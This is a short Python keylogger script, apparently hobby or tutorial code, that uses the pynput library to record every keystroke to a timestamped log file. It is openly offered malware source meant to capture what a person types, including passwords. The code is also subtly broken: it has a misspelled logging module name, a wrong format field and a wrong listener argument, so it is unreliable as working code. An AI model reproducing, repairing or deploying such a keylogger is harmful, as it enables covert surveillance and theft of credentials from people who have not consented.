#Created by Rsecurity

from pynput.keyboard import Key, Listener

import logging

#Creation of log file

log_dir = " "

logging.basicConfig(filename=(log_dir + 'key_log.txt'), level=loggin.DEBUG, format='%(asctime)s: %(messages)s:')

def on_click(key):
	logging.info(str(key))

with Listener(on_click=on_click) as listener:
	listener.join()


